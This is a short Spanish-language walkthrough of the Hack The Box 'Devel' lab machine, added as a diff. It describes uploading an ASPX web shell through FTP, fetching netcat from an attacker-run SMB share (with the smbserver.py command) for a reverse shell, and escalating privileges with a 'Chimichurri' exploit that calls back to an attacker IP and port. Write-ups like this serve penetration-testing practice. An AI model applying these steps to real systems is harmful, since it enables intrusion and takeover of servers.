@@ -1,0 +1,46 @@
+maquina devel -------------------------- htb 
+
+aprendizaje 
+
+IIS
+ASP
+Penetration Tester Level 2
+Web
+Network
+Protocols
+FTP
+Remote Code Execution
+Arbitrary File Upload
+
+--------------------------------------------------
+
+en esta maquina tenemos dos puertos abiertos, el FTP y el HTML (80 y 21) hemos podido obserbar que tenemos los mismo archivos 
+en el ftp que en la pagina por lo que hemos podido deducir que estan sincronizados a la hora de haber montado la pagina
+
+hemos subido un archivo con el comando PUT al ftp que contiene un shell web cmdasp.aspx""""" 
+
+con esa shell en la pagina hemos podido pedir al servicio que previamente hemos montado en smb en nuestra maquina 
+que nos mande un netcat teniendo el archivo nc.exe en la misma carpeta 
+
+COMANDO 
+
+smbserver.py devel $(pwd) -smb2support 
+
+como estabamos en escucha hemos accedido pero no nos deja ver ninguna de las flags que necesitamos para 
+vulnerar la maquina 
+
+por lo tanto lo que hemos hecho es tirar de windows-exploit-suggester que nos ha arrojado varios exploits para 
+escalar de privilegios...
+
+hemos cogido uno que se llama 
+
+CHIMICHURRI.exe 
+
+lo hemos subido a la maquina y listo, el funcionamiento es el mismo que tiene churrasco.exe o juicepotatoes.exe
+
+chumichurri.exe <ip> <puerto> 
+
+nos ponemos es escucha en nuestra consola y listo. 
+
+
+
